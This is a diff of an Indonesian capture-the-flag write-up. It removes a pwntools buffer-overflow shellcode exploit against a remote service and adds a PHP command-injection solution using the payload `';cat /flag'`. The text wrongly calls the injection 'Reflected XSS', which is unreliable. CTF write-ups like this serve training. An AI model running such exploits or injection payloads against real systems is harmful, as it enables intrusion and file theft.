@@ -10,59 +10,63 @@ Web Exploitation
 [web_timecorp.zip](./web_timecorp.zip)
 
 ### Analysis
-**Binary Security**
-![checksec](./img/checksec.png)
+Diberikan website seperti ini
+![preview](./img/preview.png)
 
-**Key explanation**
-- No canary found - rentan buffer overflow
-- NX disabled - Shellcode dapat dieksekusi
-- No pie - Position address selalu tetap tidak berubah ketika program dijalankan
+Ketika pertama kali melihatnya, saya berasumsi website ini rentan terhadap XSS, lalu saya tes sebagai berikut
+![xss](./img/xss.png)
 
-**Disassembly**
-![disassembly](./img/disassembly.png)
-Diawal saya menganalisa terlalu cepat sehingga saya terjebak dalam perhitungan offset yang kurang tepat, hal itu dipengaruhi
-karena saya kurang eksplorasi pada fungsi read dimana sub menyimpan nilai 0x100 = 256 dari $rsp, namun
-program membaca hingga 0x110 = 272 dari $edx, hal ini bisa memicu overflow. Namun tidak perlu sampai 272 bytes
-sudah bisa untuk mendapatkan shell ketika payload mencapai 256 bytes. Dengan memanfaatkan jmp $rsi untuk lompat ke $rsp didalam fungsi read 
-untuk membuka shell.
+Lalu saya analisa lagi source codenya sebagai berikut
+```php
+// TimeController.php
+<?php
+class TimeController
+{
+    public function index($router)
+    {
+        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
+        $time = new TimeModel($format);
+        return $router->view('index', ['time' => $time->getTime()]);
+    }
+}
+```
+Controller tidak memvalidasi query url dari client dan langsung meneruskannya ke model
 
-### EXPLOITATION
+```php
+<?php
+// TimeModel.php
+class TimeModel
+{
+    public function __construct($format)
+    {
+        $this->command = "date '+" . $format . "' 2>&1";
+    }
 
-```python
-from pwn import *
-
-exe = ELF('./regularity')
-context.binary = exe
-context.log_level = 'debug'
-
-# Testing lokal
-# io = process('./regularity')
-
-# Remote exploit
-HOST = '154.57.164.71'
-PORT = 44605
-io = remote(HOST, PORT)
-
-rsi_addr = 0x0000000000401041
-offset = 256
-
-shellcode = asm(shellcraft.sh())
-
-shellcode_len = len(shellcode)
-
-payload = shellcode + b"A" * (offset - shellcode_len) + p64(rsi_addr)
-io.recvuntil(b'days?')
-io.send(payload)
-
-# Wait for shell
-sleep(0.5)
-
-# Start interactive shell
-io.interactive()
-
+    public function getTime()
+    {
+        $time = exec($this->command);
+        $res  = isset($time) ? $time : '?';
+        return $res;
+    }
+}
 ```
 
-Ketika program mengeksekusi shell
+Didalam model query url dari controller langsung dieksekusi oleh program, ini menandakan indikasi Reflected XSS. Kita bisa membuat payload untuk mengakses direktori program salah satunya adalah flag.Lalu didalam Dockerfile direktori flag terletak di root.
+
+```
+# Copy flag
+COPY flag /flag
+```
+
+### EXPLOITATION
+Susun payload
+```
+http://154.57.164.77:40546/?format=';cat /flag'
+- single quote digunakan sebagai separator/pemisah
+- semicolon digunakan untuk mengeksekusi perintah
+```
+
+Holaa, kita dapatkan flagnya
 ![flag](./img/flag.png)
 
 ### References
